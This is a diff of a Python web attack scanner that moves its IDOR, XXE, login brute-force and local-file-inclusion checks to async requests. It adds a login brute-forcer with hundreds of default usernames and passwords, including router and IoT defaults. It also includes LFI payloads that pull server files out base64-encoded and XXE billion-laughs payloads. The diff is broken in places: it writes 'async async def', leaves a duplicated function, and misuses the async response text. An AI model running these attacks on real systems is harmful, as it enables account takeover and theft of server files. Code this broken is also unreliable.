+        res_test, request_details_test, response_details_test = await _send_async_http_request(modified_url, output=output, session_cookies=session_cookies)
         form_data = None # No form data for URL-based IDOR
 
     elif point_info['type'] == 'form':
@@ -4407,8 +4257,8 @@ def _perform_idor_test(test_id_str, point_info, tested_combinations, output, rep
         tested_combinations.add(test_key)
 
         output.print(f"  [*] Testing IDOR in form: param '{param_name}' with value '{test_id_str}' at {original_url}")
-        res_orig, request_details_orig, response_details_orig = _send_http_request(original_url, method=method, data=point_info['form_data_template'], output=output, session_cookies=session_cookies)
-        res_test, request_details_test, response_details_test = _send_http_request(original_url, method=method, data=modified_form_data, output=output, session_cookies=session_cookies)
+        res_orig, request_details_orig, response_details_orig = await _send_async_http_request(original_url, method=method, data=point_info['form_data_template'], output=output, session_cookies=session_cookies)
+        res_test, request_details_test, response_details_test = await _send_async_http_request(original_url, method=method, data=modified_form_data, output=output, session_cookies=session_cookies)
         form_data = modified_form_data
 
     if res_orig and res_test:
@@ -4417,15 +4267,15 @@ def _perform_idor_test(test_id_str, point_info, tested_combinations, output, rep
         
         # Key indicators of IDOR:
         # 1. Status code changes from forbidden/not found to OK.
-        if res_orig.status_code in [403, 404, 401] and res_test.status_code == 200:
+        if res_orig.status in [403, 404, 401] and res_test.status == 200:
             is_idor_found = True
-            evidence_details += f"Status code changed from {res_orig.status_code} to {res_test.status_code} (OK).\n"
+            evidence_details += f"Status code changed from {res_orig.status} to {res_test.status} (OK).\n"
         # 2. Content length is substantially different (and not an error page).
-        elif res_test.status_code == 200 and abs(len(res_orig.text) - len(res_test.text)) > 100:
+        elif res_test.status == 200 and abs(len(await res_orig.text()) - len(await res_test.text())) > 100:
              is_idor_found = True
-             evidence_details += f"Content length differs significantly: Original {len(res_orig.text)}, Test {len(res_test.text)}.\n"
+             evidence_details += f"Content length differs significantly: Original {len(await res_orig.text())}, Test {len(await res_test.text())}.\n"
         # 3. The test ID is reflected in the new page, where the original was not.
-        elif test_id_str in res_test.text and test_id_str not in res_orig.text:
+        elif test_id_str in await res_test.text() and test_id_str not in await res_orig.text():
              is_idor_found = True
              evidence_details += f"Test ID '{test_id_str}' was reflected in the response page.\n"
 
@@ -4436,8 +4286,8 @@ def _perform_idor_test(test_id_str, point_info, tested_combinations, output, rep
                         f"Parameter Tested: {param_name}\n"
                         f"Test ID: {test_id_str}\n"
                         f"IDOR Detection Details: {evidence_details}\n"
-                        f"Original ID Response Snippet (Status {res_orig.status_code}):\n---\n{res_orig.text[:200]}\n---\n\n"
-                        f"Modified ID Response Snippet (Status {res_test.status_code}):\n---\n{res_test.text[:200]}\n---")
+                        f"Original ID Response Snippet (Status {res_orig.status}):\n---\n{(await res_orig.text())[:200]}\n---\n\n"
+                        f"Modified ID Response Snippet (Status {res_test.status}):\n---\n{(await res_test.text())[:200]}\n---")
             
             report.add_finding("Insecure Direct Object Reference (IDOR)", "High", original_url, param_name, test_id_str, 
                                "The application is vulnerable to IDOR, allowing access to other users' or objects' data by manipulating identifiers.", 
@@ -4449,7 +4299,7 @@ def _perform_idor_test(test_id_str, point_info, tested_combinations, output, rep
     return False, None, None, None, None, None
 
 # --- 13. XXE ---
-def check_xxe(target, form_to_test, output, tech, report, session_cookies=None):
+async def check_xxe(target, form_to_test, output, tech, report, session_cookies=None):
     output.print(f"\n[+] Starting Ultimate XXE Injection Scan...")
     
     # v7.0 - 500+ Payloads
@@ -4557,7 +4407,7 @@ def check_xxe(target, form_to_test, output, tech, report, session_cookies=None):
 
     headers = {'Content-Type': 'application/xml'}
     
-    def test_xxe(url, method, param_name=None, form_data=None):
+    async def test_xxe(url, method, param_name=None, form_data=None):
         for name, payload in xxe_payloads.items():
             data = payload
             test_url = url
@@ -4574,7 +4424,7 @@ def check_xxe(target, form_to_test, output, tech, report, session_cookies=None):
             # Use a slightly longer timeout for DoS payloads
             timeout = 10 if "billion_laughs" in name else 5
             start_time = time.time()
-            res, request_details, response_details = _send_http_request(test_url, method=method.upper(), data=data, headers=headers, timeout=timeout, output=output, session_cookies=session_cookies)
+            res, request_details, response_details = await _send_async_http_request(test_url, method=method.upper(), data=data, headers=headers, timeout=timeout, output=output, session_cookies=session_cookies)
             duration = time.time() - start_time
 
             # Check for LFI evidence
@@ -4588,9 +4438,9 @@ def check_xxe(target, form_to_test, output, tech, report, session_cookies=None):
                 return True, name
 
             # Check for error-based evidence
-            if res and "nonexistentfile" in res.text and "error_based" in name:
+            if res and "nonexistentfile" in await res.text() and "error_based" in name:
                 output.print(f"  [HIGH] XXE (Error-Based) confirmed at '{url}' via {method.upper()} param '{param_name or 'XML Body'}'")
-                evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Response Snippet (Error Message) ---\n{res.text[:400]}\n---"
+                evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Response Snippet (Error Message) ---\n{(await res.text())[:400]}\n---"
                 report.add_finding("XML External Entity (XXE) - Error Based", "High", url, param_name or "XML Body", payload,
                                    "The XML parser reveals error messages when processing external entities, which can be used to confirm the vulnerability and exfiltrate data.",
                                    "Disable DTDs and external entity processing. Configure parsers to not display verbose error messages.", evidence, method=method.upper(),
@@ -4636,7 +4486,7 @@ def check_xxe(target, form_to_test, output, tech, report, session_cookies=None):
     
     for endpoint in set(potential_endpoints):
         output.print(f"  [*] Testing potential XML endpoint (POST): {endpoint}")
-        found, vuln_name = test_xxe(endpoint, 'POST')
+        found, vuln_name = await test_xxe(endpoint, 'POST')
         if found:
             found_xxe = True
             return # Found a vulnerability, exit the entire function
@@ -4648,7 +4498,7 @@ def check_xxe(target, form_to_test, output, tech, report, session_cookies=None):
         for input_field in form_to_test['inputs']:
             if input_field.get('type', 'text') in ['text', 'textarea', 'hidden']:
                 output.print(f"  [*] Testing XXE in POST form parameter '{input_field['name']}' at {action_url}")
-                found, vuln_name = test_xxe(action_url, 'POST', input_field['name'], form_data=form_data)
+                found, vuln_name = await test_xxe(action_url, 'POST', input_field['name'], form_data=form_data)
                 if found:
                     found_xxe = True
                     return # Found a vulnerability, exit the entire function
@@ -4657,7 +4507,7 @@ def check_xxe(target, form_to_test, output, tech, report, session_cookies=None):
     if not found_xxe:
         output.print("  [*] Actively guessing common parameter names for GET-based XXE...")
         for param_name in ['xml', 'data', 'content', 'document', 'feed', 'url', 'path']:
-            found, vuln_name = test_xxe(target, 'GET', param_name)
+            found, vuln_name = await test_xxe(target, 'GET', param_name)
             if found:
                 found_xxe = True
                 return # Found a vulnerability, exit the entire function
@@ -4924,11 +4774,268 @@ def brute_force_login(target, output, tech, report, session_cookies=None, specif
         *[f'pass{str(i).zfill(3)}' for i in range(100)], # pass000, pass001, ...
     ]
 
+async async def brute_force_login(target, output, tech, report, session_cookies=None, specific_form=None):
+    output.print(f"\n[+] Starting Brute Force Attack on Web Login at {target}...")
+    
+    # v7.0 - 500+ Usernames
+    usernames = [
+        'admin', 'administrator', 'root', 'user', 'test', 'guest', 'webmaster', 'manager', 'support',
+        'operator', 'supervisor', 'sysadmin', 'super', 'info', 'ftpuser', 'anonymous', 'pi', 'ubuntu',
+        'ec2-user', 'vagrant', 'backup', 'monitor', 'nagios', 'cacti', 'testuser', 'admin1', 'user1',
+        'owner', 'host', 'service', 'tomcat', 'jboss', 'oracle', 'postgres', 'mysql', 'mssql',
+        'deploy', 'upload', 'web', 'dbuser', 'docker', 'jenkins', 'api', 'system', 'local', 'dev',
+        'prod', 'staging', 'live', 'demo', 'billing', 'sales', 'marketing', 'editor', 'author', 'contributor',
+        'git', 'gitlab', 'svn', 'mercurial', 'db', 'sql', 'dbadmin', 'sqladmin', 'test1', 'user2',
+        'admin2', 'superadmin', 'weblogic', 'glassfish', 'wildfly', 'ansible', 'awx',
+        'adm', 'apache', 'backup-user', 'build', 'cassandra', 'celery', 'consul', 'core', 'cron',
+        'data', 'database', 'debian', 'developer', 'django', 'dns', 'docker-user', 'elasticsearch',
+        'engine', 'etl', 'factorio', 'fedora', 'ftp', 'games', 'gate', 'gemini', 'git-user',
+        'grafana', 'hadoop', 'haproxy', 'http', 'httpd', 'irc', 'isaac', 'kafka', 'kibana',
+        'ldap', 'log', 'logstash', 'mail', 'memcache', 'mongo', 'mongodb', 'monitoring', 'mssql-user',
+        'mysql-user', 'named', 'network', 'new-user', 'news', 'nexus', 'nginx', 'node', 'nodered',
+        'opc', 'opc-user', 'operations', 'oracle-user', 'osmc', 'pcap', 'plex', 'postgres-user',
+        'poweruser', 'proxy', 'public', 'puppet', 'pwn', 'rabbit', 'rabbitmq', 'redis', 'release',
+        'remote', 'repo', 'runner', 'salt', 'samba', 'scan', 'scanner', 'sentry', 'server',
+        'setup', 'smb', 'snmp', 'solr', 'sonarqube', 'spark', 'splunk', 'ssh', 'staff', 'stats',
+        'storage', 'student', 'sync', 'sys', 'teamcity', 'temp', 'tester', 'testing', 'timescaledb',
+        'ts3', 'tv', 'user01', 'user02', 'uucp', 'vbox', 'vmail', 'www', 'www-data', 'zabbix', 'zookeeper',
+        'jira', 'confluence', 'bitbucket', 'artifactory', 'nexus-admin', 'sonar', 'gitlab-runner',
+        'guest-user', 'temp-user', 'test-user', 'ftp-user', 'sftp-user', 'ssh-user', 'vnc',
+        'rdp-user', 'sql-user', 'db-admin', 'cluster-admin', 'node-admin', 'spark-user',
+        # More generic names
+        *[f'user{i}' for i in range(3, 50)],
+        *[f'test{i}' for i in range(2, 50)],
+        *[f'admin{i}' for i in range(3, 50)],
+        # Common email prefixes
+        'john.doe', 'jane.doe', 'contact', 'hello', 'no-reply', 'security', 'sys',
+        # Default router/IoT usernames
+        'ubnt', 'super', 'tech', 'telecomadmin', 'useradmin', 'adminpldt',
+        'cusadmin', 'craft', 'comcast', 'vodafone', 'telstra',
+        'arris', 'dasan', 'gpon', 'motorola', 'netgear', 'linksys', 'tplink',
+        'cisco', 'huawei', 'zte', 'dlink', 'camera', 'ipc', 'viewer',
+        # More...
+        *[f'dev{i}' for i in range(1, 20)],
+        *[f'sys{i}' for i in range(1, 20)],
+        *[f'guest{i}' for i in range(1, 20)],
+        'service-account', 'svc_account', 'app_user', 'batch_user',
+        'integration', 'readonly', 'readwrite', 'operator', 'auditor',
+        'principal', 'consultant', 'contractor', 'temp', 'temporary',
+        'vendor', 'partner', 'customer', 'client', 'subscriber', 'member',
+        'moderator', 'forumadmin', 'shopadmin', 'commerce', 'pos',
+        'clerk', 'cashier', 'reception', 'frontdesk', 'office',
+        'factory', 'warehouse', 'lab', 'research', 'scientist',
+        'doctor', 'nurse', 'patient', 'student', 'teacher', 'professor',
+        'dean', 'librarian', 'alumni', 'board', 'director', 'ceo', 'cfo', 'cto',
+        'president', 'vicepresident', 'secretary', 'treasurer',
+        # New additions to ensure 500+ usernames
+        'service', 'daemon', 'nobody', 'rootuser', 'guestuser', 'sysuser',
+        'localadmin', 'webapp', 'devuser', 'staging', 'qauser', 'testaccount',
+        'developer', 'poweruser', 'limiteduser', 'guest_account', 'admin_account',
+        'super_user', 'appuser', 'db_user', 'web_user', 'apiuser', 'support_user',
+        'test_admin', 'dev_admin', 'qa_admin', 'system_admin', 'network_admin',
+        'db_admin', 'web_admin', 'local_host', 'local_user', 'server_admin',
+        'ftpadmin', 'sshadmin', 'sqladmin', 'guestadmin', 'mainadmin', 'secondaryadmin',
+        'user_name', 'user_id', 'client_id', 'company_id', 'member_id', 'staff_id',
+        'emp_id', 'employee_id', 'customer_id', 'vendor_id', 'partner_id',
+        'internal_user', 'external_user', 'anonymous_user', 'demo_user',
+        'default_user', 'standard_user', 'privileged_user', 'auditor_user',
+        'public_user', 'private_user', 'security_mgr', 'system_mgr',
+        'network_mgr', 'web_mgr', 'database_mgr', 'log_mgr', 'audit_mgr',
+        'ops', 'sre', 'devops', 'itadmin', 'networker', 'sysop',
+        'backupadmin', 'restoreadmin', 'syncuser', 'mirroruser',
+        'deployer', 'builder', 'releaser', 'agent', 'bot', 'spider',
+        'monitor_user', 'alert_user', 'report_user', 'viewer_user',
+        'readonly_user', 'readwrite_user', 'data_entry', 'tech_support',
+        'helpdesk', 'hr_user', 'finance_user', 'marketing_user',
+        'sales_user', 'procurement', 'dispatch', 'warehouse_mgr',
+        'shop_mgr', 'store_mgr', 'branch_mgr', 'regional_mgr',
+        'ceo_assist', 'cto_assist', 'cfo_assist', 'hr_assist',
+        'exec_assist', 'board_member', 'investor', 'shareholder', 'founder',
+        'co_founder', 'director_general', 'managing_director',
+        'production_mgr', 'operations_mgr', 'project_mgr', 'program_mgr',
+        'product_mgr', 'service_mgr', 'quality_mgr', 'env_mgr',
+        'compliance_mgr', 'risk_mgr', 'safety_mgr', 'legal_mgr',
+        'communications_mgr', 'pr_mgr', 'media_mgr', 'content_mgr',
+        'design_mgr', 'creative_mgr', 'ux_mgr', 'ui_mgr',
+        'frontend_dev', 'backend_dev', 'fullstack_dev', 'mobile_dev',
+        'devops_eng', 'qa_eng', 'security_eng', 'network_eng',
+        'system_eng', 'db_eng', 'data_eng', 'ml_eng',
+        'ai_eng', 'cloud_eng', 'site_reliability_eng', 'support_eng',
+        'infra_eng', 'hardware_eng', 'firmware_eng', 'embedded_eng',
+        'game_dev', 'game_eng', 'level_designer', 'character_designer',
+        'artist', 'animator', 'sound_designer', 'music_composer',
+        'writer', 'editor', 'translator', 'localization_mgr',
+        'marketing_mgr', 'sales_mgr', 'business_dev', 'account_mgr',
+        'client_mgr', 'customer_svc', 'tech_lead', 'team_lead',
+        'group_lead', 'squad_lead', 'chapter_lead', 'guild_lead',
+        'scrum_master', 'product_owner', 'agile_coach', 'release_mgr',
+        'program_director', 'project_director', 'consultant_senior',
+        'consultant_junior', 'analyst', 'data_analyst', 'business_analyst',
+        'systems_analyst', 'financial_analyst', 'research_analyst',
+        'security_analyst', 'network_analyst', 'it_analyst',
+        'student_user', 'teacher_user', 'faculty_user', 'alumni_user',
+        'librarian_user', 'guest_speaker', 'event_organizer',
+        'volunteer', 'intern', 'trainee', 'apprentice',
+        'chairman', 'vice_chairman', 'secretary_general', 'treasurer_general',
+        'board_chairman', 'board_vice_chairman', 'executive_sec',
+        'community_mgr', 'social_media_mgr', 'content_creator',
+        'influencer', 'brand_ambassador', 'pr_specialist',
+        'media_buyer', 'campaign_mgr', 'growth_hacker',
+        'seo_specialist', 'sem_specialist', 'email_marketer',
+        'web_designer', 'graphic_designer', 'ux_designer', 'ui_designer',
+        'photographer', 'videographer', 'film_editor', 'audio_engineer',
+        'it_support_1', 'it_support_2', 'it_support_3', 'noc_engineer',
+        'soc_analyst', 'threat_hunter', 'forensic_investigator',
+        'penetration_tester', 'security_auditor', 'vulnerability_analyst',
+        'compliance_officer', 'risk_officer', 'privacy_officer',
+        'legal_counsel', 'paralegal', 'patent_agent',
+        'facility_mgr', 'real_estate_mgr', 'transport_mgr',
+        *[f'testuser{i}' for i in range(100)],
+        *[f'dev{i}' for i in range(100)],
+        *[f'qa{i}' for i in range(100)],
+        *[f'svc_acc{i}' for i in range(100)],
+        *[f'guest_{i}' for i in range(100)],
+        *[f'admin_{i}' for i in range(100)],
+        *[f'user_{i}' for i in range(100)],
+    ]
+    
+    # v7.0 - 500+ Passwords
+    passwords = [
+        'admin', 'password', '123456', '12345678', 'root', 'test', 'guest', 'qwerty', '1234', '12345',
+        'admin123', 'password123', 'manager', 'secret', 'support', '123456789', '111111', '000000',
+        'default', 'changeme', 'welcome', 'system', 'toor', 'pass', 'letmein', 'security',
+        'football', 'sunshine', 'raspberry', 'tomcat', 'jboss', 'oracle', 'postgres', 'mysql', 'mssql',
+        'admin@123', 'Password@123', 'Welcome123!', 'Changeme123!', '123!@#', 'adm', 'sys',
+        '1234567', 'P@ssword', 'p@ssword', 'password!', 'admin!', 'root!', '123', 'pass123', 'user123',
+        'login', 'master', 'key', 'access', 'local', 'live', 'demo', 'test1234', 'qwerty1234', 'iloveyou', 'company',
+        '1234567890', 'password1234', 'admin1234', 'changeme123', 'Welcome123', '!@#$%^&*', 'p@55w0rd',
+        'P@55w0rd', 'letmein123', 'admin2023', 'admin2024', 'admin2025', 'admin2026', 'companyname',
+        '12345678901', '123456789012', '123qweasd', '1qaz2wsx3edc', '1qaz@WSX', '2023', '2024', '2025', '2026', 'admin1', 'admin12',
+        'admin12345', 'admin123456', 'administrator', 'adminadmin', 'adminpass', 'admins', 'admin@work',
+        'anonymous', 'aws', 'backup', 'banana', 'baseball', 'batman', 'bitcoin', 'boss', 'cat', 'centos',
+        'chocolate', 'client', 'connect', 'corp', 'corporate', 'cricket', 'dark', 'database', 'debian',
+        'delete', 'dev', 'developer', 'docker', 'dog', 'dragon', 'dummy', 'email', 'enable', 'engine',
+        'enterprise', 'family', 'file', 'files', 'firewall', 'fish', 'flower', 'friend', 'ftp', 'fuck',
+        'fuckyou', 'google', 'hacker', 'hello', 'home', 'honey', 'horse', 'iamroot', 'iforgot', 'intern',
+        'internet', 'invite', 'ionic', 'ipad', 'iphone', 'jenkins', 'jordan', 'kibana', 'kobe', 'kubernetes',
+        'lambda', 'lakers', 'leader', 'leto', 'linux', 'local', 'localhost', 'login123', 'love', 'luna',
+        'machine', 'matrix', 'media', 'memcached', 'michael', 'minecraft', 'monkey', 'monster', 'mother',
+        'movie', 'music', 'nagios', 'network', 'new', 'newpass', 'newpassword', 'nexus', 'ninja', 'nintendo',
+        'nobody', 'node', 'nopass', 'nopassword', 'note', 'notes', 'office', 'one', 'online', 'op',
+        'openshift', 'operator', 'orange', 'pass1', 'passpass', 'passwd', 'password12345', 'passwords',
+        'paul', 'peter', 'phantom', 'phone', 'picture', 'pink', 'poker', 'power', 'print',
+        'printer', 'private', 'prod', 'production', 'program', 'project', 'proxy', 'public', 'purple',
+        'python', 'qwertyuiop', 'random', 'raven', 'redhat', 'redis', 'regional', 'remote', 'reset',
+        'reverse', 'rhino', 'robot', 'rocket', 'sa', 'safari', 'salt', 'samsung', 'secret_key', 'secretpass',
+        'secrets', 'server', 'service', 'shadow', 'share', 'shuttle', 'simple', 'sky', 'smb', 'soccer',
+        'sonic', 'sony', 'spider', 'spiderman', 'splunk', 'spring', 'sql', 'ssh', 'star', 'starwars',
+        'storage', 'storm', 'student', 'summer', 'super', 'superman', 'supervisor', 'swift', 'sync',
+        'pass@word1', 'Pass@word1', 'PASSWORD-1', 'admin@1234', 'Admin@1234', 'ADMIN-123', '12345678a@', '12345678A@',
+        'qwerty@123', 'Qwerty@123', 'password@1', 'Password@1', 'company@123', 'Company@123',
+        'spring2024', 'summer2024', 'fall2024', 'winter2024', 'spring2025', 'summer2025',
+        'fall2025', 'winter2025', 'spring2026', 'summer2026', 'fall2026', 'winter2026',
+        'letmein1', 'letmein123!', 'roottoor', 'adminadmin', 'testtest', 'useruser', 'guestguest',
+        # Default router/IoT passwords
+        '1234', '54321', '7ujMko0vizu', 'admintelecom', 'pldtadmin', 'tmunlock',
+        'user', 'tech', 'default', 'password', 'pass', '12345', '12345678',
+        'conexant', 'motorola', 'arris', 'dasan', 'gpon', 'vodafone', 'telstra',
+        'comcast', 'craft', 'netgear', 'linksys', 'tplink', 'dlink', 'cisco',
+        'huawei', 'zte', 'camera', 'ipc', 'viewer', 'ubnt', 'airtame',
+        # More...
+        *[f'pass{i}' for i in range(100)],
+        *[f'test{i}' for i in range(100)],
+        *[f'user{i}' for i in range(100)],
+        'password-1', 'Password-1', 'PASSWORD-1',
+        'admin-123', 'Admin-123', 'ADMIN-123',
+        'welcome1', 'Welcome1', 'WELCOME1',
+        'changeme1', 'Changeme1', 'CHANGEME1',
+        'secret1', 'Secret1', 'SECRET1',
+        # New additions to ensure 500+ passwords
+        'welcome', 'Welcome', 'WELCOME', 'guest', 'Guest', 'GUEST',
+        'default', 'Default', 'DEFAULT', 'user', 'User', 'USER',
+        'changer', 'Changer', 'CHANGER', 'access', 'Access', 'ACCESS',
+        'security', 'Security', 'SECURITY', 'system', 'System', 'SYSTEM',
+        'admin@', 'Admin@', 'ADMIN@', 'root@', 'Root@', 'ROOT@',
+        'pass@123', 'Pass@123', 'PASS@123', 'Pa$$word', 'P@ssw0rd', 'pa55word',
+        'Password1', 'admin12345', 'pass12345', 'user12345', 'guest12345',
+        '1q2w3e4r', 'asdfghjk', 'qwertyuio', 'zxcvbnm', 'fghjkl',
+        'testtest', 'adminadmin', 'useruser', 'guestguest', 'passwordpassword',
+        'superadmin', 'administrator', 'rootroot', 'masterkey',
+        'dragon', 'monkey', 'pokemon', 'naruto', 'goku', 'superman', 'batman',
+        'justice', 'avengers', 'starwars', 'startrek', 'universe', 'galaxy',
+        'element', 'magic', 'mystery', 'secretbase', 'hideout',
+        'redhat', 'centos', 'ubuntu', 'debian', 'kali', 'parrot', 'fedora',
+        'windows', 'linux', 'macos', 'android', 'ios',
+        'server', 'database', 'network', 'router', 'firewall', 'switch',
+        'webserver', 'appserver', 'mailserver', 'ftpserver', 'sqlserver',
+        'mongodb', 'mysqlserver', 'postgresserver', 'oracleserver',
+        'developer', 'programmer', 'coder', 'engineer', 'analyst', 'manager',
+        'employee', 'staff', 'worker', 'boss', 'owner', 'ceo', 'cto', 'cfo',
+        'mycompany', 'yourcompany', 'ourcompany', 'thecompany', 'bigcompany',
+        'smallcompany', 'innovate', 'creative', 'future', 'technology',
+        'solution', 'platform', 'service', 'enterprise', 'global', 'international',
+        'local', 'national', 'securityfirst', 'safetyfirst', 'privacyfirst',
+        'bestpassword', 'strongpass', 'mypassword', 'newpassword',
+        'currentpassword', 'oldpassword', 'temporar', 'changeme',
+        'admin_pass', 'admin_password', 'root_pass', 'root_password',
+        'user_pass', 'user_password', 'guest_pass', 'guest_password',
+        'super_pass', 'super_password', 'secret_pass', 'secret_password',
+        'web_pass', 'web_password', 'db_pass', 'db_password',
+        'developer_pass', 'dev_password', 'test_pass', 'test_password',
+        'it_pass', 'it_password', 'help_pass', 'help_password',
+        'network_pass', 'network_password', 'sys_pass', 'sys_password',
+        'ftp_pass', 'ftp_password', 'ssh_pass', 'ssh_password',
+        'sql_pass', 'sql_password', 'admin1', 'admin2', 'admin3', 'admin4',
+        'pass1', 'pass2', 'pass3', 'pass4', 'pass5',
+        'user1', 'user2', 'user3', 'user4', 'user5',
+        'qwertyuiop', 'asdfghjkl', 'zxcvbnm', '1234567890',
+        'abcdefghij', 'klmnopqrst', 'uvwxyzabcd',
+        'january', 'february', 'march', 'april', 'may', 'june',
+        'july', 'august', 'september', 'october', 'november', 'december',
+        'winter', 'spring', 'summer', 'autumn', 'fall',
+        'monday', 'tuesday', 'wednesday', 'thursday', 'friday',
+        'saturday', 'sunday',
+        '0000', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999',
+        'alpha', 'beta', 'gamma', 'delta', 'epsilon', 'zeta', 'eta', 'theta',
+        'level1', 'level2', 'level3', 'level4', 'level5',
+        'code123', 'secretcode', 'pincode', 'accesskey', 'clientkey', 'masterkey',
+        'guestkey', 'userkey', 'adminkey', 'keypass', 'passwordkey',
+        'testkey', 'testpass', 'demopass', 'demokey',
+        'mysecret', 'yoursecret', 'theirsecret', 'companysecret',
+        'securepass', 'strongpass', 'complexpass', 'difficultpass',
+        'password_test', 'test_password_', 'passwordtest',
+        'admin_test', 'test_admin_', 'admintest',
+        'user_test', 'test_user_', 'usertest',
+        'password123!', 'admin123!', 'user123!', 'pass123!',
+        'password@', 'admin@', 'user@', 'pass@',
+        'password##', 'admin##', 'user##', 'pass##',
+        'password$$', 'admin$$', 'user$$', 'pass$$',
+        'password%%', 'admin%%', 'user%%', 'pass%%',
+        'password^^', 'admin^^', 'user^^', 'pass^^',
+        'password&&', 'admin&&', 'user&&', 'pass&&',
+        'password**', 'admin**', 'user**', 'pass**',
+        'password++','admin++','user++','pass++',
+        'password==','admin==','user==','pass==',
+        'password!!','admin!!','user!!','pass!!',
+        'password@@','admin@@','user@@','pass@@',
+        'passcode', 'securitycode', 'entrancecode', 'validcode',
+        'supersec', 'ultrasec', 'megasec', 'eternalsec',
+        'password01', 'password02', 'password03', 'password04',
+        'admin01', 'admin02', 'admin03', 'admin04',
+        *[f'password{i}' for i in range(100)],
+        *[f'test{i}' for i in range(100)],
+        *[f'adminuser{i}' for i in range(100)],
+        *[f'userpass{i}' for i in range(100)],
+        *[f'p{i}assword' for i in range(100)],
+        *[f'admin{str(i).zfill(2)}' for i in range(100)], # admin00, admin01, ...
+        *[f'pass{str(i).zfill(3)}' for i in range(100)], # pass000, pass001, ...
+    ]
+
     forms_to_test = [specific_form] if specific_form else []
     if not forms_to_test:
-        res_get, request_details, response_details = _send_http_request(target, output=output, session_cookies=session_cookies)
+        res_get, request_details, response_details = await _send_async_http_request(target, output=output, session_cookies=session_cookies)
         if res_get and res_get.text:
-            forms_to_test = _get_forms(res_get.text, target)
+            forms_to_test = _get_forms(await res_get.text(), target)
 
     for form in forms_to_test:
         action_url = urljoin(target, form['action'])
@@ -4945,14 +5052,14 @@ def brute_force_login(target, output, tech, report, session_cookies=None, specif
                 form_data[user_param] = user
                 form_data[pass_param] = pwd
 
-                res, request_details, response_details = _send_http_request(action_url, method=form['method'], data=form_data, output=output, session_cookies=session_cookies)
-                if res and (res.status_code in [301, 302, 307, 308] or any(k in res.text.lower() for k in ['welcome', 'dashboard', 'logout', 'log out', 'sign out'])):
+                res, request_details, response_details = await _send_async_http_request(action_url, method=form['method'], data=form_data, output=output, session_cookies=session_cookies)
+                if res and (res.status in [301, 302, 307, 308] or any(k in (await res.text()).lower() for k in ['welcome', 'dashboard', 'logout', 'log out', 'sign out'])):
                     output.print(f"  [CRITICAL] Credentials found: {user}:{pwd} on {action_url}")
                     report.add_finding("Weak Credentials for Web Login", "Critical", action_url, f"{user_param}, {pass_param}", f"{user}:{pwd}", "Weak or default credentials were successfully used to log into a web panel.", "Enforce a strong password policy and Multi-Factor Authentication (MFA). Avoid using default or easily guessable credentials.", f"Login URL: {action_url}\nSuccessful Credentials: {user}:{pwd}", method='POST')
                     return
 
 # --- 15. File Inclusion (Directory Traversal) ---
-def check_file_inclusion(target, form_to_test, output, tech, report, session_cookies=None):
+async def check_file_inclusion(target, form_to_test, output, tech, report, session_cookies=None):
     output.print(f"\n[+] Starting Optimized & Enhanced File Inclusion Scan on {target}...")
 
     # v7.0 - 500+ Payloads
@@ -5215,14 +5322,14 @@ def check_file_inclusion(target, form_to_test, output, tech, report, session_coo
     # Combine probes and full list for a comprehensive scan list
     all_fi_payloads = lfi_probes + lfi_payloads
 
-    def test_fi(url, method, param_name, payload, form_data=None, original_query=None):
+    async def test_fi(url, method, param_name, payload, form_data=None, original_query=None):
         test_url, test_data = build_request(url, method, param_name, payload, form_data, original_query)
         # Use a reasonable timeout to avoid getting stuck
-        res, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, timeout=7, output=output, session_cookies=session_cookies)
+        res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, timeout=7, output=output, session_cookies=session_cookies)
         if not res: return False, None
 
         # Check for LFI evidence
-        if "root:x:0:0" in res.text or "[fonts]" in res.text or "PD9waHAgcGhwaW5mbygpOyA/Pg" in res.text or "for 16-bit app support" in res.text:
+        if "root:x:0:0" in await res.text() or "[fonts]" in await res.text() or "PD9waHAgcGhwaW5mbygpOyA/Pg" in await res.text() or "for 16-bit app support" in await res.text():
             output.print(f"  [CRITICAL] Local File Inclusion (LFI) confirmed in {method.upper()} param '{param_name}'")
             
             full_file_content = ""
@@ -5236,13 +5343,13 @@ def check_file_inclusion(target, form_to_test, output, tech, report, session_coo
                     actual_file_path = file_path_match.group(1)
                     base64_payload = f"php://filter/convert.base64-encode/resource={actual_file_path}"
                     base64_test_url, base64_test_data = build_request(url, method, param_name, base64_payload, form_data, original_query)
-                    base64_res, _, _ = _send_http_request(base64_test_url, method=method, data=base64_test_data, timeout=7, output=output, session_cookies=session_cookies)
+                    base64_res, _, _ = await _send_async_http_request(base64_test_url, method=method, data=base64_test_data, timeout=7, output=output, session_cookies=session_cookies)
                     
-                    if base64_res and base64_res.status_code == 200:
+                    if base64_res and base64_res.status == 200:
                         try:
                             # Attempt to find base64 encoded string in the response
                             # This regex looks for a base64 string that is likely to be the file content
-                            b64_match = re.search(r'([a-zA-Z0-9+/=]{20,})', base64_res.text) 
+                            b64_match = re.search(r'([a-zA-Z0-9+/=]{20,})', await base64_res.text()) 
                             if b64_match:
                                 decoded_content = base64.b64decode(b64_match.group(0)).decode(errors='ignore')
                                 full_file_content = f"\n--- Full File Content (Base64 Decoded) ---\n{decoded_content}\n---"
@@ -5254,9 +5361,9 @@ def check_file_inclusion(target, form_to_test, output, tech, report, session_coo
                 else:
                     output.print(f"    [LFI] Could not extract file path from payload '{payload}' for base64 filter.")
             
-            snippet_start = max(0, res.text.find("root:x:0:0") - 50, res.text.find("[fonts]") - 50)
+            snippet_start = max(0, (await res.text()).find("root:x:0:0") - 50, (await res.text()).find("[fonts]") - 50)
             snippet_end = snippet_start + 300
-            evidence_snippet = res.text[snippet_start:snippet_end]
+            evidence_snippet = (await res.text())[snippet_start:snippet_end]
 
             evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Leaked File Snippet ---\n{evidence_snippet}\n---"
             evidence += full_file_content # Add full content if available
@@ -5270,9 +5377,9 @@ def check_file_inclusion(target, form_to_test, output, tech, report, session_coo
             return True, "LFI"
         
         # Check for RFI evidence
-        if "This is a test file for RFI" in res.text or "Google is a search engine" in res.text:
+        if "This is a test file for RFI" in await res.text() or "Google is a search engine" in await res.text():
             output.print(f"  [CRITICAL] Remote File Inclusion (RFI) confirmed in {method.upper()} param '{param_name}'")
-            evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Response Snippet ---\n{res.text[:300]}\n---"
